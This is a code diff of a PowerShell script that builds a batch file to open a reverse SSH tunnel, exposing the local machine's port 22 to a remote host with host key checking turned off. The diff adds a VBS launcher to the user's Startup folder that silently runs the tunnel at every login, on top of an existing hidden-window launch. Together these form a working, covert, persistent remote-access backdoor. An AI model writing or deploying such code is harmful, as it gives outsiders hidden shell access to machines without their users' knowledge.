@@ -155,7 +155,7 @@ $batContent = @"
 @echo off
 echo [INFO] Trying reverse SSH tunnel at %%date%% %%time%% by %%USERNAME%% using $receivedPort port on remote host>> "$logFile"
 timeout /t 30 /nobreak > nul
-""C:\ProgramData\ssh_portable\ssh.exe"" -o "StrictHostKeyChecking=no" -o "ExitOnForwardFailure=yes" -i "$keyFile" -N -f -R $receivedPort`:127.0.0.1`:22 $user@$remote_host >> "$logFile" 2>&1
+C:\ProgramData\ssh_portable\ssh.exe -o "StrictHostKeyChecking=no" -o "ExitOnForwardFailure=yes" -i "$keyFile" -N -f -R $receivedPort`:127.0.0.1`:22 $user@$remote_host >> "$logFile" 2>&1
 if %%ERRORLEVEL%% EQU 0 (
     echo [SUCCESS] SSH tunnel established successfully at %date% %time% >> "$logFile"
 ) else (
@@ -170,6 +170,20 @@ Set-Content -Path $batFilePath -Value $batContent -Encoding ASCII
 # Run the reverse tunnel .bat file now (optional: comment out if you don't want it to start immediately)
 Start-Process -FilePath "$batFilePath" -WindowStyle Hidden
 #Start-Process -FilePath "$batFilePath"
+
+
+# Create the VBS file
+$vbsFilePath = "C:\Users\$username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rev_ssh.vbs"
+
+# VBS content to silently execute the BAT file
+$vbsContent = @"
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run chr(34) & "$batFilePath" & chr(34), 0
+Set WshShell = Nothing
+"@
+
+# Save the VBS file
+Set-Content -Path $vbsFilePath -Value $vbsContent -Encoding ASCII
 
 # Try running the powershell command directly
 #$command = "`"C:\ProgramData\ssh_portable\ssh.exe`" -o StrictHostKeyChecking=no -o ExitOnForwardFailure=yes -i `"$keyFile`" -N -f -R $receivedPort`:127.0.0.1`:22 $user@$remote_host"
